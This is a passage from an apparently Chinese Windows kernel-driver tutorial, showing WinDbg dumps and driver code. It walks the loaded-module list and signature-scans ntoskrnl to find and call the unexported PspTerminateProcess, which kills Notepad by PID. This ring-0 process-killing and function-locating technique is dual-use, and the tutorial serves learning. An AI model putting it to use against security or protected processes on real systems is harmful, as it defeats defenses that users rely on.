<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _LDR_DATA_TABLE_ENTRY <span class="number">0x863064b0</span></span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x8055e720</span> - <span class="number">0x85d1fa88</span> ]</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0xffffffff</span> - <span class="number">0xffffffff</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x12</span> - <span class="number">0x0</span> ]</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : <span class="number">0xf78a6000</span> Void</span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : <span class="number">0xf78a7020</span> Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : <span class="number">0x6000</span></span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;\??\C:\Documents and Settings\A1v1n\桌面\0115_2_输出参数PDRIVER_OBJECT.sys&quot;</span></span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;0115_2_输出参数PDRIVER_OBJECT.sys&quot;</span></span><br><span class="line">   +<span class="number">0x034</span> Flags            : <span class="number">0x1104000</span></span><br><span class="line">   +<span class="number">0x038</span> LoadCount        : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x03a</span> TlsIndex         : <span class="number">0x63</span></span><br><span class="line">   +<span class="number">0x03c</span> HashLinks        : _LIST_ENTRY [ <span class="number">0xffffffff</span> - <span class="number">0x2e30</span> ]</span><br><span class="line">   +<span class="number">0x03c</span> SectionPointer   : <span class="number">0xffffffff</span> Void</span><br><span class="line">   +<span class="number">0x040</span> CheckSum         : <span class="number">0x2e30</span></span><br><span class="line">   +<span class="number">0x044</span> TimeDateStamp    : <span class="number">0xfffffffe</span></span><br><span class="line">   +<span class="number">0x044</span> LoadedImports    : <span class="number">0xfffffffe</span> Void</span><br><span class="line">   +<span class="number">0x048</span> EntryPointActivationContext : (null) </span><br><span class="line">   +<span class="number">0x04c</span> PatchInformation : <span class="number">0x00310030</span> Void</span><br></pre></td></tr></table></figure>

<p>其中较重要的几个属性：</p>
<ul>
<li>InLoadOrderLinks：是个结构体，是个链表。有两个成员：Flink 和 Blink。。</li>
<li>DllBase：当前模块的基址</li>
<li>SizeOfImage：当前模块大小</li>
<li>FullDllName：完整的模块名，以<code>\??\</code>格式开始</li>
</ul>
<p>3环有点区别，<strong>在0环中InMemoryOrderLinks 和 InInitializationOrderLinks 是没用的</strong>，只需要关注第一个链表 InLoadOrderLinks。_LIST_ENTRY 这个结构体存了两个地址，指向前一个节点和下一个节点：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br><span class="line"></span><br><span class="line">kd&gt; dt _LIST_ENTRY</span><br><span class="line">ntdll!_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> Flink            : Ptr32 _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x004</span> Blink            : Ptr32 _LIST_ENTRY</span><br></pre></td></tr></table></figure>

<p>通过这个 InLoadOrderLinks，我们可以遍历整个高2G的模块了。<strong>InLoadOrderLinks.Flink 指向的就是下一个 _LDR_DATA_TABLE_ENTRY</strong>。下面给出遍历内核模块链表的代码：</p>
<blockquote>
<p><a href="https://zhidao.baidu.com/question/983263436191263299.html">网上说的比较常见的4种方法：</a></p>
<p>1、通过DriverEntry传入的DriverObject参数的DriverSection成员指向LDR_DATA_TABLE_ENTRY结构，通过遍历这张表得到ntoskrnl的基址和大小</p>
<p>2、ZwQuerySystemInformation大法</p>
<p>3、搜索内存 </p>
<p>4、利用KPCR结构</p>
</blockquote>
<p>则InLoadOrderLinks &#x3D; 0x863064b0，执行如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _LIST_ENTRY <span class="number">0x863064b0</span></span><br><span class="line">ntdll!_LIST_ENTRY</span><br><span class="line"> [ <span class="number">0x8055e720</span> - <span class="number">0x85d1fa88</span> ]</span><br><span class="line">   +<span class="number">0x000</span> Flink            : <span class="number">0x8055e720</span> _LIST_ENTRY [ <span class="number">0x863fc3b0</span> - <span class="number">0x863064b0</span> ]</span><br><span class="line">   +<span class="number">0x004</span> Blink            : <span class="number">0x85d1fa88</span> _LIST_ENTRY [ <span class="number">0x863064b0</span> - <span class="number">0x85fa9e80</span> ]</span><br></pre></td></tr></table></figure>

<p>可知：</p>
<ul>
<li>0x8055e720：Flink，指向后一个_LDR_DATA_TABLE_ENTRY</li>
<li>0x85d1fa88：Blink，指向前一个_LDR_DATA_TABLE_ENTRY</li>
</ul>
<h3 id="1-5-练习：遍历内核中所有模块"><a href="#1-5-练习：遍历内核中所有模块" class="headerlink" title="1.5 练习：遍历内核中所有模块"></a>1.5 练习：遍历内核中所有模块</h3><p>宏CONTAINING_RECORD：返回一个结构体实例的基地址，该结构的类型和结构的一个成员地址已知。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PCHAR  <span class="title">CONTAINING_RECORD</span><span class="params">( </span></span></span><br><span class="line"><span class="function"><span class="params">    IN PCHAR  Address, </span></span></span><br><span class="line"><span class="function"><span class="params">    IN TYPE  Type, </span></span></span><br><span class="line"><span class="function"><span class="params">    IN PCHAR  Field </span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>Address：指向当前结构体实例某成员的指针。</li>
<li>Type：结构体名称。</li>
<li>Field：结构体某个成员的名称。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;<span class="comment">//这个成员把系统所有加载(可能是停止没被卸载)已经读取到内存中,双链表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;<span class="comment">//系统已经启动,没有被初始化,没有调用DriverEntry这个历程的时候,通过这个链表进程串接起来</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;<span class="comment">//已经调用DriverEntry这个函数的所有驱动程序</span></span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry</span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径</span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">( IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Head = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Tail = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pLDR_Head = (PLDR_DATA_TABLE_ENTRY)driver-&gt;DriverSection;</span><br><span class="line">	pLDR_Tail = pLDR_Head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//pLDR_Blink = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(pLDR_Flink,LDR_DATA_TABLE_ENTRY,InLoadOrderLinks);</span></span><br><span class="line">		DbgPrint(<span class="string">&quot;DllBase:%08X,SizeOfImage:%08X,FullDllName:%wZ\r\n&quot;</span>,pLDR_Tail-&gt;DllBase,pLDR_Tail-&gt;SizeOfImage,\</span><br><span class="line">		&amp;pLDR_Tail-&gt;FullDllName);</span><br><span class="line">		pLDR_Tail = (PLDR_DATA_TABLE_ENTRY)pLDR_Tail-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(pLDR_Head != pLDR_Tail);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，Windbg 无法打印带中文的 UNICODE_STRING，建议把项目名取成全英文。</p>
<p><img data-src="https://s2.loli.net/2022/01/16/2NrEFpBSiAQW3bU.png" alt="13.png"></p>
<h2 id="2-未导出函数PspTerminateProcess"><a href="#2-未导出函数PspTerminateProcess" class="headerlink" title="2 未导出函数PspTerminateProcess"></a>2 未导出函数PspTerminateProcess</h2><p>PspTerminateProcess是0环的一个<strong>未导出函数</strong>，用来结束一个进程。函数PspTerminateProcess在ntoskerlpa.exe（2-9-9-12）中，是未导出函数，许多流氓软件无法关闭，就是因为HOOK了这个函数。</p>
<div class="note default"><p>从3环到0环的大概调用过程：TerminateProcess --&gt; ntdll.NtTerminateProcess(ntdll.ZwTerminateProcess) --&gt; PsTerminteProcess  --&gt;  PspTerminateProcess  --&gt; PspTerminateThreadByPointer  --&gt; KeInitializeApc&#x2F;KeInsertQueueApc(插入了一个核心态的APC调用，若是用户线程，会再插入用户态的APC调用，最终线程在自己的执行环境中) -&gt; PspExitThread。</p>
</div>

<p>在结束一个进程的过程中，可能有很多API会被HOOK。海哥说过，如果他HOOK 3环的API，你就HOOK 0环的API，比他更底层他就防不住你。但是越是底层，对用户的体验越不好，稍微操作不当就会蓝屏。</p>
<p>函数<code>PspTerminateProcess</code>定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS NTAPI <span class="title">PspTerminateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  	PEPROCESS Process,</span></span></span><br><span class="line"><span class="function"><span class="params">  	NTSTATUS ExitStatus</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<div class="note info"><p>其中第一个参数是PEPROCESS的指针，可以根据PID通过<strong>PsLookupProcessByProcessId</strong> 获得（头文件<code>ntifs.h</code>），而第二个参数指定退出状态码。可以用<a href="https://blog.csdn.net/hjxyshell/article/details/17312119">ZwQuerySystemInformation</a>通过进程名找PID。在驱动开发引入的<code>&lt;wdm.h&gt;</code>里提供了<code>MmGetSystemRoutineAddress</code>函数，根据函数名可以直接获取到<strong>已导出</strong>的函数地址。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">PsLookupProcessByProcessId</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    IN HANDLE ProcessId,</span></span></span><br><span class="line"><span class="function"><span class="params">    OUT PEPROCESS *Process</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">ZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Inout_   PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_opt_ PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<div class="note danger"><p><code>PspTerminateProcess</code>是未导出函数，找未导出函数的几种思路：</p>
<ul>
<li>Windbg + .pdb（得到函数特征码）</li>
<li>特征码搜索，先得到函数所在模块的加载基址，然后遍历内存</li>
<li>A –&gt; B，A是导出函数，调用了B（未导出函数），通过A调用的地址来定位B</li>
<li>利用函数想对当前模块的偏移来定位函数：ImageBase+Offset</li>
</ul>
</div>

<h3 id="2-1-Windbg-pdb"><a href="#2-1-Windbg-pdb" class="headerlink" title="2.1 Windbg + .pdb"></a>2.1 Windbg + .pdb</h3><p>在有内核PDB的情况下，用Windbg可以直接找到该函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u PspTerminateProcess L20</span><br><span class="line">nt!PspTerminateProcess:</span><br><span class="line"><span class="number">805</span>d3b18 <span class="number">8b</span>ff            mov     edi,edi</span><br><span class="line"><span class="number">805</span>d3b1a <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">805</span>d3b1b <span class="number">8b</span>ec            mov     ebp,esp</span><br><span class="line"><span class="number">805</span>d3b1d <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">805</span>d3b1e <span class="number">64</span>a124010000    mov     eax,dword ptr fs:[<span class="number">00000124</span>h]</span><br><span class="line"><span class="number">805</span>d3b24 <span class="number">8b</span>7508          mov     esi,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">805</span>d3b27 <span class="number">3b</span>7044          cmp     esi,dword ptr [eax+<span class="number">44</span>h]</span><br><span class="line"><span class="number">805</span>d3b2a <span class="number">7507</span>            jne     nt!PspTerminateProcess+<span class="number">0x1b</span> (<span class="number">805</span>d3b33)</span><br><span class="line"><span class="number">805</span>d3b2c b80d0000c0      mov     eax,<span class="number">0</span>C000000Dh</span><br><span class="line"><span class="number">805</span>d3b31 eb5a            jmp     nt!PspTerminateProcess+<span class="number">0x75</span> (<span class="number">805</span>d3b8d)</span><br><span class="line"><span class="number">805</span>d3b33 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">805</span>d3b34 <span class="number">8</span>dbe48020000    lea     edi,[esi+<span class="number">248</span>h]</span><br><span class="line"><span class="number">805</span>d3b3a f6470120        test    byte ptr [edi+<span class="number">1</span>],<span class="number">20</span>h</span><br><span class="line"><span class="number">805</span>d3b3e <span class="number">7412</span>            je      nt!PspTerminateProcess+<span class="number">0x3a</span> (<span class="number">805</span>d3b52)</span><br><span class="line"><span class="number">805</span>d3b40 <span class="number">8</span>d8674010000    lea     eax,[esi+<span class="number">174</span>h]</span><br><span class="line"><span class="number">805</span>d3b46 <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">805</span>d3b47 <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">805</span>d3b48 <span class="number">68</span>ea3a5d80      push    offset nt!NtTerminateProcess+<span class="number">0x14c</span> (<span class="number">805</span>d3aea)</span><br><span class="line"><span class="number">805</span>d3b4d e8f2eeffff      call    nt!PspCatchCriticalBreak (<span class="number">805</span>d2a44)</span><br><span class="line"><span class="number">805</span>d3b52 <span class="number">6</span>a08            push    <span class="number">8</span></span><br><span class="line"><span class="number">805</span>d3b54 <span class="number">58</span>              pop     eax</span><br><span class="line"><span class="number">805</span>d3b55 f00907          lock <span class="keyword">or</span> dword ptr [edi],eax</span><br><span class="line"><span class="number">805</span>d3b58 <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">805</span>d3b5a <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">805</span>d3b5b e8784f0000      call    nt!PsGetNextProcessThread (<span class="number">805</span>d8ad8)</span><br><span class="line"><span class="number">805</span>d3b60 <span class="number">8b</span>f8            mov     edi,eax</span><br><span class="line"><span class="number">805</span>d3b62 <span class="number">85f</span>f            test    edi,edi</span><br><span class="line"><span class="number">805</span>d3b64 <span class="number">741</span>e            je      nt!PspTerminateProcess+<span class="number">0x6c</span> (<span class="number">805</span>d3b84)</span><br><span class="line"><span class="number">805</span>d3b66 ff750c          push    dword ptr [ebp+<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">805</span>d3b69 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">805</span>d3b6a e807fdffff      call    nt!PspTerminateThreadByPointer (<span class="number">805</span>d3876)</span><br><span class="line"><span class="number">805</span>d3b6f <span class="number">57</span>              push    edi</span><br></pre></td></tr></table></figure>

<p>0x805d3b18 就是函数头，然而这个值由于重定位，可能会变的，所以我们就要用其他办法，确保每次都能找到这个函数。</p>
<h3 id="2-2-通过已导出函数"><a href="#2-2-通过已导出函数" class="headerlink" title="2.2 通过已导出函数"></a>2.2 通过已导出函数</h3><p>第二种办法是根据已导出函数找未导出函数，在驱动开发引入的<code>&lt;wdm.h&gt;</code>里提供了<code>MmGetSystemRoutineAddress</code>函数，根据函数名可以直接获取到<strong>已导出</strong>的函数地址。</p>
<ol>
<li><p>在IDA中任意找一个导出函数的地址：ZwQueryInformationProcess：0x00429934。</p>
<p><img data-src="https://s2.loli.net/2022/01/16/ng1pLzJZrvyM8sN.png" alt="14.png"></p>
</li>
<li><p>在Windbg中获取该函数的地址：0x80501934。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u ZwQueryInformationProcess</span><br><span class="line">nt!ZwQueryInformationProcess:</span><br><span class="line"><span class="number">80501934</span> b89a000000      mov     eax,<span class="number">9</span>Ah</span><br><span class="line"><span class="number">80501939</span> <span class="number">8</span>d542404        lea     edx,[esp+<span class="number">4</span>]</span><br><span class="line"><span class="number">8050193</span>d <span class="number">9</span>c              pushfd</span><br><span class="line"><span class="number">8050193</span>e <span class="number">6</span>a08            push    <span class="number">8</span></span><br><span class="line"><span class="number">80501940</span> e80c0b0400      call    nt!KiSystemService (<span class="number">80542451</span>)</span><br><span class="line"><span class="number">80501945</span> c21400          ret     <span class="number">14</span>h</span><br></pre></td></tr></table></figure>
</li>
<li><p>函数PspTerminateProcess在Windbg的地址：0x805d3b18。则0x805d3b18 - (0x80501934 - 0x00429934) &#x3D; 0x004FBB18。</p>
</li>
<li><p>在IDA中按<code>G</code>输入0x004FBB18定位到代码段：（<em>该方法如果<code>ntoskerlpa.exe</code>重定位了就无法使用了</em>）</p>
<p><img data-src="https://s2.loli.net/2022/01/16/I4CUNzWPLTVsog9.png" alt="15.png"></p>
</li>
<li><p>在IDA，鼠标定位到该函数，View - Open subviews - Cross reference 查看该函数的交叉引用情况。</p>
<p><img data-src="https://s2.loli.net/2022/01/16/NpbWX9M4nTzHvGA.png" alt="16.png"></p>
</li>
</ol>
<p>可以看到A函数没有一个是导出函数，故该方法不适用。</p>
<h3 id="2-3-模块基址-偏移"><a href="#2-3-模块基址-偏移" class="headerlink" title="2.3 模块基址+偏移"></a>2.3 模块基址+偏移</h3><p>虽然模块基址会变，但是函数相对基址的偏移是不变的，通过这个规律也可以找到想要的函数。<br>PspTerminateProcess 相对内核基址的偏移 &#x3D; 0x805d3b18 - (0x80501934 - 0x00429934)  &#x3D; 0x004FBB18<br>只要找到内核基址，加上 0x004FBB18 就是 PspTerminateProcess 的地址。</p>
<p>这种方法我就不贴代码了，因为原理比较简单。</p>
<h3 id="2-4-特征码匹配（最常用）"><a href="#2-4-特征码匹配（最常用）" class="headerlink" title="2.4 特征码匹配（最常用）"></a>2.4 特征码匹配（最常用）</h3><div class="note warning"><p>提取特征码（硬编码）注意几个问题：</p>
<ul>
<li>绕开所有函数都有的指令。如PUSH EBP；MOV EBP，ESP等对应的硬编码</li>
<li>然开全局变量等和重定位有关的指令，该模块下次加载地址会变</li>
<li>要提取代码中特征明显，功能很小众的代码</li>
<li>最好跳着提特征码：8b 75 08 3b 70 44 ?? ?? ?? ?? 68 20 d5 62 80 ?? ?? ?? ?? 68 20</li>
</ul>
</div>

<h3 id="2-5-练习：使用PspTerminateProcess关闭记事本"><a href="#2-5-练习：使用PspTerminateProcess关闭记事本" class="headerlink" title="2.5 练习：使用PspTerminateProcess关闭记事本"></a>2.5 练习：使用PspTerminateProcess关闭记事本</h3><p>大致流程如下：</p>
<ol>
<li>先获取函数特征码。</li>
<li>确定函数所在的内核模块，通过内核模块遍历获取<code>ntoskerlpa.exe</code>模块的基址和大小（使用到<code>PDRIVER_OBJECT</code>）。</li>
<li>到指定模块中，根据特征码按字节比对，确定函数<code>PspTerminateProcess</code>的地址。</li>
<li>通过函数指针，关闭指定进程。</li>
</ol>
<p>选取函数一段特征码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">805</span>d3b1e <span class="number">64</span>a124010000    mov     eax,dword ptr fs:[<span class="number">00000124</span>h]</span><br><span class="line"><span class="number">805</span>d3b24 <span class="number">8b</span>7508          mov     esi,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">805</span>d3b27 <span class="number">3b</span>7044          cmp     esi,dword ptr [eax+<span class="number">44</span>h]</span><br><span class="line"><span class="number">805</span>d3b2a <span class="number">7507</span>            jne     nt!PspTerminateProcess+<span class="number">0x1b</span> (<span class="number">805</span>d3b33)</span><br><span class="line"><span class="number">805</span>d3b2c b80d0000c0      mov     eax,<span class="number">0</span>C000000Dh</span><br><span class="line"><span class="number">805</span>d3b31 eb5a            jmp     nt!PspTerminateProcess+<span class="number">0x75</span> (<span class="number">805</span>d3b8d)</span><br><span class="line"><span class="number">805</span>d3b33 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">805</span>d3b34 <span class="number">8</span>dbe48020000    lea     edi,[esi+<span class="number">248</span>h]</span><br><span class="line"><span class="number">805</span>d3b3a f6470120        test    byte ptr [edi+<span class="number">1</span>],<span class="number">20</span>h</span><br><span class="line"><span class="number">805</span>d3b3e <span class="number">7412</span>            je      nt!PspTerminateProcess+<span class="number">0x3a</span> (<span class="number">805</span>d3b52)</span><br><span class="line"><span class="number">805</span>d3b40 <span class="number">8</span>d8674010000    lea     eax,[esi+<span class="number">174</span>h]</span><br></pre></td></tr></table></figure>

<p>特征码搜索，先得到函数所在模块（ntoskerlpa.exe）的加载基址，然后遍历内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;ntifs.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function">ULONG <span class="title">GetKernelMoudleInfo</span><span class="params">(IN PDRIVER_OBJECT pDriver,OUT PVOID* DllBase,OUT PULONG SizeOfImage)</span></span>;</span><br><span class="line"><span class="function">PVOID <span class="title">Find_FeatureCode</span><span class="params">(PVOID pShellCode,ULONG ulShellCode_Len,PVOID DllBase,ULONG ulSizeOfImage)</span></span>;</span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;<span class="comment">//这个成员把系统所有加载(可能是停止没被卸载)已经读取到内存中,双链表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;<span class="comment">//系统已经启动,没有被初始化,没有调用DriverEntry这个历程的时候,通过这个链表进程串接起来</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;<span class="comment">//已经调用DriverEntry这个函数的所有驱动程序</span></span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry</span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径</span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">( IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG ulShellCode[] =</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x0124a164</span>, <span class="number">0x758b0000</span>, <span class="number">0x44703b08</span>, <span class="number">0x0db80775</span>,</span><br><span class="line">		<span class="number">0xebc00000</span>, <span class="number">0xbe8d575a</span>, <span class="number">0x00000248</span>, <span class="number">0x200147f6</span>,</span><br><span class="line">		<span class="number">0x868d1274</span>, <span class="number">0x00000174</span></span><br><span class="line">	&#125;;</span><br><span class="line">	ULONG ulRet = <span class="number">0</span>;</span><br><span class="line">	PVOID DllBase = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG SizeOfImage = <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*_PspTerminateProcess)</span><span class="params">(PEPROCESS pEprocess, NTSTATUS ExitCode)</span></span>;</span><br><span class="line">	_PspTerminateProcess PspTerminateProcess;</span><br><span class="line">	PEPROCESS pEprocess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ulRet = GetKernelMoudleInfo(driver,&amp;DllBase,&amp;SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!ulRet)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;驱动程序获取ntoskrnl.exe模块失败.\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	PspTerminateProcess = (_PspTerminateProcess)Find_FeatureCode((PVOID)ulShellCode,<span class="keyword">sizeof</span>(ulShellCode),DllBase,SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!PspTerminateProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;PspTerminateProcess特征码搜索失败.\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PsLookupProcessByProcessId((HANDLE)<span class="number">2796</span>,&amp;pEprocess); <span class="comment">// 记事本PID是2796</span></span><br><span class="line">	PspTerminateProcess(pEprocess, <span class="number">0</span>);</span><br><span class="line">	DbgPrint(<span class="string">&quot;记事本进程被 PspTerminateProcess 函数关闭了.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ULONG <span class="title">GetKernelMoudleInfo</span><span class="params">(IN PDRIVER_OBJECT pDriver,OUT PVOID* DllBase,OUT PULONG SizeOfImage)</span></span></span><br><span class="line"><span 